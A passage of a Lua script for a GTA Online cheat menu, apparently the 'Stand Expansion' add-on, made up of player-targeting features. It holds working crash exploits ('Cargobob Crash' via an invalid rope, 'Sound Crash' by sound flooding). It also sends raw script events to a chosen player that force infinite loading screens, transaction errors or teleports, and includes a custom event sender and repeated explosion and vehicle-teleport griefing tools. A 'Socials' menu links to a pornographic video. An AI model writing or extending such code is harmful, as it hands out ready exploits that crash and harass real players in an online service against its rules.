    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    util.yield()
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    util.yield(250)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    util.yield(1000)
    for i = 1, 5 do
        util.spoof_script("freemode", SYSTEM.WAIT)
    end
    ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
end)

menu.action(custselc, "Cargobob Crash", {}, "Invalid Rope", function()
    menu.trigger_commands("anticrashcam on")
    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TPpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
    local cargobob = CreateVehicle(0XFCFCB68B, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
    local veh = CreateVehicle(0X187D938D, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local vehPos = ENTITY.GET_ENTITY_COORDS(veh, true)
    local newRope = PHYSICS.ADD_ROPE(TPpos.x, TPpos.y, TPpos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false
        , 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, veh, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehPos.x,
        vehPos.y, vehPos.z, 2, false, false, 0, 0, "Center", "Center")
    util.yield(2500)
    entities.delete_by_handle(cargobob)
    entities.delete_by_handle(veh)
    PHYSICS.DELETE_CHILD_ROPE(newRope)
    menu.trigger_commands("anticrashcam off")
    notification.normal("Cargobob Crash ~g~completed~w~")
end)

menu.action(custselc, "Sound Crash", {}, "Beep Boop Crash", function()
    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local time = util.current_time_millis() + 2000
    while time > util.current_time_millis() do
        local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
        for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x, TPPS.y, TPPS.z, "GTAO_FM_Events_Soundset",
                true, 100000, false)
        end
        util.yield()
        for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x, TPPS.y, TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
        end
        util.yield()
    end
    notification.normal("Sound Crash ~g~completed~w~")
end)

--------------------------------------------------------------------------------------------------------------------------

local mainsettings = menu.list(menuroot, "Settings")

menuToggle(mainsettings, "Enable/Disable notifications", {}, "Disables notifications like 'stickybomb placed!' or 'entity marked.' Stuff like that. Those get annoying with the Pan feature especially.", function(on)
    if on then
        SE_Notifications = true
    else
        SE_Notifications = false
    end
end)

menuToggle(mainsettings, "Enable/Disable ArrayList", {"arraylist"}, "God, please, save me. Save me from this.", function(on)
    if on then
        SE_ArrayList = true
    else
        SE_ArrayList = false
    end
end)

--------------------------------------------------------------------------------------------------------------------------

local socials = menu.list(menu.my_root(), "Socials", {}, "")

menu.hyperlink(socials, "Discord", "https://discord.gg/uddDraCeyD")
menu.hyperlink(socials, "Youtube", "https://www.youtube.com/@flkmods")
menu.hyperlink(socials, "Kekma", "https://kekma.net/")
menu.hyperlink(socials, "Pornhub", "https://de.pornhub.com/view_video.php?viewkey=ph6016183b2f870")
menu.hyperlink(socials, "Github", "https://github.com/N0mbyy")

--------------------------------------------------------------------------------------------------------------------------

SE_explodeDelay = 0
local function playerActionsSetup(pid)
    menu.divider(menu.player_root(pid), scriptName)
    local playerMain = menu.list(menu.player_root(pid), scriptName, {"staexp", "StandExpansion"}, "")
    menu.divider(playerMain, scriptName)
    local playerSuicides = menu.list(playerMain, "Suicides", {}, "") 
    local playerWeapons = menu.list(playerMain, "Weapons", {}, "") 
    local playerTools = menu.list(playerMain, "Tools", {}, "") 
    local playerOtherTrolling = menu.list(playerMain, "Trolling", {}, "")
    

-----------------------------------------------------------------------------------------------------------------------------------

    playerOtherTrolling:action("Send suicide Clown", {}, "", function()
        local ped = get_player_ped_script_index(pid)
        local random_offset = get_offset_from_entity_in_world_coords(ped, math.random(-8, 8), math.random(-8, 8), 0)
        local clown_hash = util.joaat("s_m_y_clown_01")
        util.request_model(clown_hash)
        local clown_ped = entities.create_ped(0, clown_hash, random_offset, 0.0)
        local target_position = get_entity_coords(ped, true)
        set_entity_invincible(clown_ped, true)
        entities.set_can_migrate(clown_ped, false)
        set_blocking_of_non_temporary_events(clown_ped, true)
        task_go_to_coord_any_means(clown_ped, target_position.x, target_position.y, target_position.z, 5.0, 0, false, 0, 0.0)
        set_ped_keep_task(clown_ped, true)
        stop_ped_speaking(clown_ped, true)
    
        func.use_fx_asset("scr_rcbarry2")
        start_networked_particle_fx_non_looped_on_entity("scr_clown_appears", clown_ped, 0.0, 0.0, -1.0, 0.0, 0.0, 0.0, 0.5, false, false, false)
    
        local ped_pos = get_entity_coords(clown_ped, true)
        local rel = v3.new(target_position)
        rel:sub(ped_pos)
        local rot = rel:toRot()
        set_entity_rotation(clown_ped, rot.x, rot.y, rot.z, 2, false)
    
        util.create_tick_handler(function()
            local ped_pos = get_entity_coords(clown_ped, true)
            local target_position = get_entity_coords(ped, true)
            if not does_entity_exist(clown_ped) then
                return false
            elseif func.get_distance_between(ped_pos, target_position) > 50 then
                entities.delete_by_handle(clown_ped)
                return false
            elseif func.get_distance_between(ped_pos, target_position) < 3.0 then
                func.use_fx_asset("scr_rcbarry2")
                start_networked_particle_fx_non_looped_at_coord("scr_exp_clown", ped_pos.x, ped_pos.y, ped_pos.z, 0.0, 0.0, 0.0, 1.0, false, false, false, false)
                add_explosion(ped_pos.x, ped_pos.y, ped_pos.z, 1, 1, true, true, 0.5, false)
                entities.delete_by_handle(clown_ped)
                return false
            elseif func.get_distance_between(ped_pos, target_position) > 3.0 then
                if func.get_entity_control_onces(clown_ped) then
                    task_go_to_coord_any_means(clown_ped, target_position.x, target_position.y, target_position.z, 5.0, 0, false, 0, 0.0)
                    util.yield(100)
                end
            end
        end)
    end)

-----------------------------------------------------------------------------------------------------------------------------------

menu.action(lobbyFeats, "Alle zum Puff!", {}, "Geh beten ihr NNN versager", function()
    menu.trigger_commands("posx 118")
    menu.trigger_commands("posy -1287")
    menu.trigger_commands("posz 28")
    menu.trigger_commands("summonall")
end)

local vans = {"burrito4", "boxville3", "camper", "gburrito", "surfer2", "boxville5", "journey", "speedo2", "youga3"}
playerOtherTrolling:action("Send Bomb Van", {}, "", function()
    local player_pos = players.get_position(pid)
    local target_ped = get_player_ped_script_index(pid)
    local vehicle_hash = util.joaat(vans[math.random(#vans)])
    util.request_model(vehicle_hash)

    local vehicle = entities.create_vehicle(vehicle_hash, v3.new(player_pos.x + math.random(-20, 20), player_pos.y + math.random(-20, 20), player_pos.z), 0)
    set_entity_load_collision_flag(vehicle, true, true)
    set_entity_as_mission_entity(vehicle, true, true)
    local vehicle_coords = get_entity_coords(vehicle, true)

    local driver_ped = create_random_ped(vehicle_coords.x, vehicle_coords.y, vehicle_coords.z)
    table.insert(spawned_rampage_peds, driver_ped)
    set_entity_load_collision_flag(driver_ped, true, true)
    set_entity_as_mission_entity(driver_ped, true, true)

    local rel = v3.new(player_pos)
    rel:sub(vehicle_coords)
    local rot = rel:toRot()
    set_entity_rotation(vehicle, rot.x, rot.y, rot.z, 2, false)
    modify_vehicle_top_speed(vehicle, 20000)
    set_vehicle_doors_locked_for_all_players(vehicle, true)
    set_vehicle_is_considered_by_player(vehicle, false)

    set_ped_into_vehicle(driver_ped, vehicle, -1)
    
    set_ped_combat_attributes(driver_ped, 3, true)
    set_ped_combat_attributes(driver_ped, 1, true)
    set_blocking_of_non_temporary_events(driver_ped, true)
    set_ped_can_be_knocked_off_vehicle(driver_ped, 1)
    task_vehicle_mission_ped_target(driver_ped, vehicle, target_ped, 6, 100.0, 0, 0.0, 0.0, true)

    util.create_tick_handler(function()
		local vehicle_coords = get_entity_coords(vehicle, true)
		local target_position = get_entity_coords(target_ped, true)
		if not does_entity_exist(vehicle) then
            entities.delete_by_handle(driver_ped)
			return false
		elseif func.get_distance_between(vehicle_coords, target_position) > 50 then
			local player_pos = players.get_position(pid)
            set_entity_coords(vehicle, player_pos.x + math.random(-20, 20), player_pos.y + math.random(-20, 20), player_pos.z, false, false, false, false)
            local vehicle_coords = get_entity_coords(vehicle, true)
            local rel = v3.new(player_pos)
            rel:sub(vehicle_coords)
            local rot = rel:toRot()
            set_entity_rotation(vehicle, rot.x, rot.y, rot.z, 2, false)
		elseif func.get_distance_between(vehicle_coords, target_position) < 4 then
			add_explosion(vehicle_coords.x, vehicle_coords.y, vehicle_coords.z, 1, 1, true, false, 0.5, false)
            util.yield(2500)
			entities.delete_by_handle(vehicle)
            entities.delete_by_handle(driver_ped)
			return false
		end
	end)
end)

menu.toggle_loop(playerOtherTrolling, "Fuck Chat", {}, "Player cant see the chat anymore. Most likely wont work on modders with spam protection", function()
    menu.trigger_commands("sendpm" .. players.get_name(players.user()))
end)

-----------------------------------------------------------------------------------------------------------------------------------

    menuAction(playerSuicides, "Make Player Explode Themselves", {"suicide"}, "", function()
        local playerPed = getPlayerPed(pid)
        local playerCoords = getEntityCoords(playerPed)
        if players.is_godmode(pid) and not players.is_in_interior(pid) then
            util.toast("Player is in godmode, stopping explode...")
        elseif players.is_in_interior(pid) then
            util.toast("Player is in an interior, stopping explode...")
        elseif PED.IS_PED_IN_ANY_VEHICLE(playerPed, true) then
            for i = 0, 50, 1 do 
                SE_add_owned_explosion(playerPed, playerCoords.x, playerCoords.y, playerCoords.z, 5, 10, SEisExploAudible, SEisExploInvis, 0)
                wait(10)
            end
        else
            SE_add_owned_explosion(playerPed, playerCoords.x, playerCoords.y, playerCoords.z, 1, 10, SEisExploAudible, SEisExploInvis, 0)
        end
    end)
    menuToggleLoop(playerSuicides, "Loop Explode Suicide", {"loopsuicide"}, "Loops suicidal explosions.", function()
        local playerPed = getPlayerPed(pid)
        local playerCoords = getEntityCoords(playerPed)
        if players.is_godmode(pid) and not players.is_in_interior(pid) then
            util.toast("Player is in godmode, stopping explode...")
        elseif players.is_in_interior(pid) then
            util.toast("Player is in an interior, stopping explode...")
        else
            SE_add_owned_explosion(playerPed, playerCoords.x, playerCoords.y, playerCoords.z, 1, 10, SEisExploAudible, SEisExploInvis, 0)
        end
        wait(SE_explodeDelay)
    end)
    menuAction(playerSuicides, "Make Player Molotov Themselves", {"suimolly", "suimolotov"}, "Fire will not stay on the player if invisibility is enabled.", function()
        local playerPed = getPlayerPed(pid)
        local playerCoords = getEntityCoords(playerPed)
        if players.is_godmode(pid) and not players.is_in_interior(pid) then
            util.toast("Player is in godmode, stopping explode...")
        elseif players.is_in_interior(pid) then
            util.toast("Player is in an interior, stopping explode...")
        else
            SE_add_owned_explosion(playerPed, playerCoords.x, playerCoords.y, playerCoords.z, 3, 10, SEisExploAudible, SEisExploInvis, 0)
        end
    end)
    menuToggleLoop(playerSuicides, "Loop Molotov Suicide", {"loopsuimolly", "loopsuimolotov"}, "Loops suicidal molotovs.", function()
        local playerPed = getPlayerPed(pid)
        local playerCoords = getEntityCoords(playerPed)
        if players.is_godmode(pid) and not players.is_in_interior(pid) then
            util.toast("Player is in godmode, stopping explode...")
        elseif players.is_in_interior(pid) then
            util.toast("Player is in an interior, stopping explode...")
        else
            SE_add_owned_explosion(playerPed, playerCoords.x, playerCoords.y, playerCoords.z, 3, 10, SEisExploAudible, SEisExploInvis, 0)
        end
        wait(SE_explodeDelay)
    end)

    menu.click_slider(playerSuicides, "Change explosion delay (ms)", {"SEexpdel"}, "Changes the explosion delay in milliseconds. Max 10sec (10000ms)", 0, 10000, 0, 10, function(val)
        SE_explodeDelay = val
    end)

    -----------------------------------------------------------------------------------------------------------------------------------

    menuToggleLoop(playerWeapons, "Explosion Gun", {"pexplogun"}, "Gives the player an explosion gun.", function ()
        local pped = getPlayerPed(pid)
        local shot = WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(pped, SE_pImpactCoord)
        if shot then
            local explo = memory.read_vector3(SE_pImpactCoord)
            SE_add_owned_explosion(pped, explo.x, explo.y, explo.z, 2, 10, SEisExploAudible, SEisExploInvis, 0)
        end
    end)

    -----------------------------------------------------------------------------------------------------------------------------------

    local scriptev = menu.list(playerOtherTrolling, "Earrapes", {}, "Script caused events. \nPlayers with a bought mod menu can detect you.")

    menu.action(scriptev, "Loser", {}, "It will trigger some events that will make everyone hear the sound. \nPlayers with a bought mod menu can detect you.", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            menu.trigger_commands("scripthost")
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "LOSER", pc.x, pc.y, pc.z, "HUD_AWARDS", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    
    menu.action(scriptev, "Transition", {}, "It will trigger some events that will make everyone hear the sound. \nPlayers with a bought mod menu can detect you.", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            menu.trigger_commands("scripthost")
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "1st_Person_Transition", pc.x, pc.y, pc.z, "PLAYER_SWITCH_CUSTOM_SOUNDSET", true, 9999, false)
            end
            util.yield_once()
        end
    end)

    menu.action(scriptev, "Respawn", {}, "It will trigger some events that will make everyone hear the sound. \nPlayers with a bought mod menu can detect you.", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            menu.trigger_commands("scripthost")
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Hit", pc.x, pc.y, pc.z, "RESPAWN_ONLINE_SOUNDSET", true, 9999, false)
            end
            util.yield_once()
        end
    end)

    menu.action(scriptev, "Air defenses", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pc.x, pc.y, pc.z, "DLC_sum20_Business_Battle_AC_Sounds", true, 9999, false)
            end
            util.yield_once()
        end
    end)

-----------------------------------------------------------------------------------------------------------------------------------

    local especialev = menu.list(playerOtherTrolling, "Special events", {}, "Some Script Events. Dont Abuse")

    menu.action(especialev, "Remote ILS 'Test'", {}, "(Infinite Loading Screen)", function()
        menu.trigger_commands("scripthost")
        for i = 1, 6 do
            util.trigger_script_event(1 << pid, {891653640, pid, math.random(1, 32), 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
    end)

    menu.action(especialev, "Remote ST 'Test'", {}, "(Re-Start Tutorial)", function()
        menu.trigger_commands("scripthost")
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 20, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(especialev, "Remote SGM 'Test'", {}, "(Start arcade mini game)", function()
        menu.trigger_commands("scripthost")
        util.trigger_script_event(1 << pid, {-95341040, players.user(), pid, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(especialev, "Remote 1v1 'Test'", {}, "", function()
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 197, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)
    
    menu.action(especialev, "Remote TE 'Test'", {}, "(Transaction Error)", function()
        for i = 1, 8 do
            util.trigger_script_event(1 << pid, {-957260626, pid, memory.script_global(1669394 + 1 + (pid * 403))})
        end
    end)

    menu.action(especialev, "Remote GMODE 'Test'", {}, "", function()
        for i = 1, 8 do
            util.trigger_script_event(1 << pid, {-957260626, pid, memory.script_global(1669394 + 1 + (pid * 2))})
        end
    end)

    menu.action(especialev, "Remote Payout 'Test'", {}, "(Will give them the GoodSport payout)", function()
        for i = 1, 2 do
            util.trigger_script_event(1 << pid, {-957260626, pid, memory.script_global(1669394 + 1 + (pid * 85))})
        end
    end)

    local vehicletrolling = menu.list(playerOtherTrolling, "Vehicle trolling", {}, "")
    menuAction(vehicletrolling, "Place wall in front of player", {}, "Places walls in front of player. Delete after half a second. Use this when they are driving forward for EPIC TROLLING.", function ()
        local ped = getPlayerPed(pid)
        local forwardOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 4, 0)
        local pheading = ENTITY.GET_ENTITY_HEADING(ped)
        local hash = 309416120
        requestModel(hash)
        while not hasModelLoaded(hash) do wait() end
        local a1 = OBJECT.CREATE_OBJECT(hash, forwardOffset.x, forwardOffset.y, forwardOffset.z - 1, true, true, true)
        ENTITY.SET_ENTITY_HEADING(a1, pheading + 90)
        fastNet(a1, pid)
        local b1 = OBJECT.CREATE_OBJECT(hash, forwardOffset.x, forwardOffset.y, forwardOffset.z + 1, true, true, true)
        ENTITY.SET_ENTITY_HEADING(b1, pheading + 90)
        fastNet(b1, pid)
        wait(500)
        entities.delete_by_handle(a1)
        entities.delete_by_handle(b1)
    end)

    VehTroll_VehicleName = "adder"
    VehTroll_Invis = false

    menu.divider(vehicletrolling, "Drop Vehicle")

    menuAction(vehicletrolling, "Drop vehicle on player", {}, "", function ()
        local ped = getPlayerPed(pid)
        local pc = getEntityCoords(ped)
        local hash = joaat(VehTroll_VehicleName)
        requestModel(hash)
        while not hasModelLoaded(hash) do wait() end
        local ourveh = VEHICLE.CREATE_VEHICLE(hash, pc.x, pc.y, pc.z + 5, 0, true, true, false)
        if VehTroll_Invis then
            ENTITY.SET_ENTITY_VISIBLE(ourveh, false, 0)
        end
        noNeedModel(hash)
        wait(1200)
        entities.delete_by_handle(ourveh)
    end)

    menu.text_input(vehicletrolling, "Input Vehicle Name", {"vehtrollname"}, "Input a vehicle name for vehicle drop. The actual NAME that is assigned to it in RAGE, e.g. OppressorMK2 = oppressor2.", function (text)
        VehTroll_VehicleName = tostring(text)
    end, "adder")

    menuToggle(vehicletrolling, "Make Vehicle Invisible?", {"vehtrollinvis"}, "Makes the vehicle trolling vehicle invisible.", function(toggle)
        VehTroll_Invis = toggle
    end)

    -----------------------------------------------------------------------------

    menu.divider(vehicletrolling, "Teleport Player's Vehicle")

    menuAction(vehicletrolling, "Teleport Player Into Ocean", {"tpocean"}, "Telepots the player's vehicle into the ocean. May need multiple clicks.", function()
        local ped = getPlayerPed(pid)
        local pc = getEntityCoords(ped)
        local oldcoords = getEntityCoords(getLocalPed())
        for o = 0, 10 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(getLocalPed(), pc.x, pc.y, pc.z + 10, false, false, false)
            wait(50)
        end
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            for a = 0, 10 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, 4500, -4400, 4, false, false, false)
                wait(100)
            end
            if SE_Notifications then
                util.toast("Teleported " .. getPlayerName_pid(pid) .. " into the farthest ocean!")
            end
        else
            util.toast("Player " .. getPlayerName_pid(pid) .. " is not in a vehicle!")
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(getLocalPed(), oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
    end)

    menuAction(vehicletrolling, "Teleport Player Onto Maze Bank", {"tpmazebank"}, "Telepots the player's vehicle onto the Maze Bank tower. May need multiple clicks.", function()
        local ped = getPlayerPed(pid)
        local pc = getEntityCoords(ped)
        local oldcoords = getEntityCoords(getLocalPed())
        for o = 0, 10 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(getLocalPed(), pc.x, pc.y, pc.z + 10, false, false, false)
            wait(50)
        end
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false) 
            for a = 0, 10 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, -76, -819, 327, false, false, false)
                wait(100)
            end
            if SE_Notifications then
                util.toast("Teleported " .. getPlayerName_pid(pid) .. " onto the Maze Bank tower!")
            end
        else
            util.toast("Player " .. getPlayerName_pid(pid) .. " is not in a vehicle!")
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(getLocalPed(), oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
    end)

    menuToggleLoop(vehicletrolling, "FakeLag Player's Vehicle", {"vehfakelag"}, "Teleports the player's vehicle behind them a bit, simulating lag.", function ()
        local ped = getPlayerPed(pid)
        if PED.IS_PED_IN_ANY_VEHICLE(ped) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            local velocity = ENTITY.GET_ENTITY_VELOCITY(veh)
            local oldcoords = getEntityCoords(ped)
            wait(500)
            local nowcoords = getEntityCoords(ped)
            for a = 1, 10 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                wait()
            end
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
            wait(200)
            for b = 1, 10 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                wait()
            end
            ENTITY.SET_ENTITY_VELOCITY(veh, velocity.x, velocity.y, velocity.z)
            for c = 1, 10 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                wait()
            end
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, nowcoords.x, nowcoords.y, nowcoords.z, false, false, false)
            for d = 1, 10 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                wait()
            end
            ENTITY.SET_ENTITY_VELOCITY(veh, velocity.x, velocity.y, velocity.z)
            wait(500)
        else
            util.toast("Player " .. getPlayerName_pid(pid) .. " is not in a vehicle!")
        end
    end)

    -----------------------------------------------------------------------------------------------------------------------------------

    local ptossf = menu.list(playerOtherTrolling, "Toss Features", {}, "")

    menuToggleLoop(ptossf, "Toss Player Around", {"tossplayer", "toss", "ragtoss"}, "Loops no-damage explosions on the player. They will be invisible if you set them as such.", function()
        local playerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), true)

        SE_add_explosion(playerCoords['x'], playerCoords['y'], playerCoords['z'], 1, 1, SEisExploAudible, SEisExploInvis, 0, true)
    end)

    menuToggleLoop(ptossf, "Get Weapon Impact", {}, "Gets the coodinates that you want them to go to from your shot.", function()
        local SE_impactCoord = memory.alloc()
        local junk = WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(SE_LocalPed, SE_impactCoord)
        if junk then
            Want = memory.read_vector3(SE_impactCoord)
            if SE_Notifications then
                util.toast(Want.x .. " " .. Want.y .. " " .. Want.z)
            end
        end
        memory.free(SE_impactCoord)
    end)

    menuAction(ptossf, "Weapon Impact Debug", {}, "", function ()
        util.toast(Want.x .. " " .. Want.y .. " " .. Want.z)
    end)

    menuAction(ptossf, "Clear location memory", {}, "", function ()
        Want.x = 0
        Want.y = 0
        Want.z = 0
    end)
    -----------------------------------

    menuToggleLoop(ptossf, "Better Toss", {"bettertoss"}, "IT'S FINALLY HERE!.", function ()
        local targetPed = getPlayerPed(pid)
        local targetcoords = getEntityCoords(targetPed)
        if targetcoords.z >= Want.z then
            if targetcoords.x > Want.x - 2 and targetcoords.x < Want.x + 2 then
                if targetcoords.y > Want.y - 2 and targetcoords.y < Want.y + 2 then
                    for i = 1, 5, 1 do
                        SE_add_explosion(targetcoords.x, targetcoords.y, targetcoords.z + 2, 1, 1, SEisExploAudible, SEisExploInvis, 0, true)
                        wait()
                    end
                    util.toast("Player " .. tostring(PLAYER.GET_PLAYER_NAME(pid)) .. " has reached the desired location.")
                    util.toast("Shutting off Better Toss.")
                    menu.trigger_commands("bettertoss" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
                end
            end
        end
        if targetcoords.z < Want.z + 3 then 
            SE_add_explosion(targetcoords.x, targetcoords.y, targetcoords.z - 2, 1, 1, SEisExploAudible, SEisExploInvis, 0, true) 
            SE_add_explosion(targetcoords.x - 1, targetcoords.y, targetcoords.z, 1, 1, SEisExploAudible, SEisExploInvis, 0, true)
            SE_add_explosion(targetcoords.x + 1, targetcoords.y, targetcoords.z, 1, 1, SEisExploAudible, SEisExploInvis, 0, true)
            SE_add_explosion(targetcoords.x, targetcoords.y - 1, targetcoords.z, 1, 1, SEisExploAudible, SEisExploInvis, 0, true)
            SE_add_explosion(targetcoords.x, targetcoords.y + 1, targetcoords.z, 1, 1, SEisExploAudible, SEisExploInvis, 0, true)
        else
            if targetcoords.x < Want.x - 2 then
                SE_add_explosion(targetcoords.x - 2, targetcoords.y, targetcoords.z + 1.5, 1, 1, SEisExploAudible, SEisExploInvis, 0, true)
            elseif targetcoords.x > Want.x - 2 then
                SE_add_explosion(targetcoords.x + 2, targetcoords.y, targetcoords.z + 1.5, 1, 1, SEisExploAudible, SEisExploInvis, 0, true)
            end
            if targetcoords.y < Want.y - 2 then
                SE_add_explosion(targetcoords.x, targetcoords.y - 2, targetcoords.z + 1.5, 1, 1, SEisExploAudible, SEisExploInvis, 0, true)
            elseif targetcoords.y > Want.y - 2 then
                SE_add_explosion(targetcoords.x, targetcoords.y + 2, targetcoords.z + 1.5, 1, 1, SEisExploAudible, SEisExploInvis, 0, true)
            end
        end
    end)

    local ptoxic = menu.list(playerOtherTrolling, "Toxic Features", {}, "")
    -----------------------------------
    
    menuAction(ptoxic, "Send to Warehouse", {}, "", function ()
        util.trigger_script_event(1 << pid, {-446275082, pid, 0, 1, 0})
    end)

    menu.divider(ptoxic, "Send Custom Script Event")

    CU_SE_MAIN = 0
    CU_SE_PARAM1 = 0
    CU_SE_PARAM2 = 0
    CU_SE_PARAM3 = 0
    CU_SE_PARAM4 = 0

    menuAction(ptoxic, "Send Custom Script Event", {"sendcustomse"}, "Advanced users only.", function ()
        util.trigger_script_event(1 << pid, {CU_SE_MAIN, CU_SE_PARAM1, CU_SE_PARAM2, CU_SE_PARAM3, CU_SE_PARAM4})
    end)

    menu.slider(ptoxic, "Custom Script Event Hash", {"customsehash"}, "", -2147483648, 2147483647, 0, 1, function (value)
        CU_SE_MAIN = value
    end)

    menu.slider(ptoxic, "Param1", {"customparam1"}, "", -2147483648, 2147483647, 0, 1, function (value)
        CU_SE_PARAM1 = value
    end)

    menu.slider(ptoxic, "Param2", {"customparam2"}, "", -2147483648, 2147483647, 0, 1, function (value)
        CU_SE_PARAM2 = value
    end)

    menu.slider(ptoxic, "Param3", {"customparam3"}, "", -2147483648, 2147483647, 0, 1, function (value)
        CU_SE_PARAM3 = value
    end)


    local moche = menu.list(playerTools, "Move Check")

    --preload
    SE_waittime = 1000
    menuToggleLoop(moche, "Move Check", {"movecheck"}, "Notifies you if the selected player is moving. Useful for people who were AFK.", function ()
        local pped = getPlayerPed(pid)
        local pcoords1 = getEntityCoords(pped)
        wait(SE_waittime)
        local pcoords2 = getEntityCoords(pped)
        if pcoords1.x ~= pcoords2.x or pcoords1.y ~= pcoords2.y or pcoords1.z ~= pcoords2.z then
            local playerName = tostring(PLAYER.GET_PLAYER_NAME(pid))
            util.toast(playerName .. " is moving!")
        end
    end)

    menu.slider(moche, "Move Check Interval (ms)", {"movecheckms"}, "How many milliseconds need to pass for it to check for movement, 1000ms = 1sec", 1, 60000, 1000, 100, function(value)
        SE_waittime = value
        if SE_Notifications then
            util.toast("Set move check interval to " .. SE_waittime)
        end
    end)

    local playpan = menu.list(playerTools, "Pan.")

    Ptools_PanTable = {}
    Ptools_PanCount = 1
    Ptools_FishPan = 20

    menuAction(playpan, "Pan.", {"pan"}, "Pan feature.", function ()
        local targetped = getPlayerPed(pid)
        local targetcoords = getEntityCoords(targetped)

        local hash = joaat("tug")
        requestModel(hash)
        while not hasModelLoaded(hash) do wait() end

        for i = 1, Ptools_FishPan do
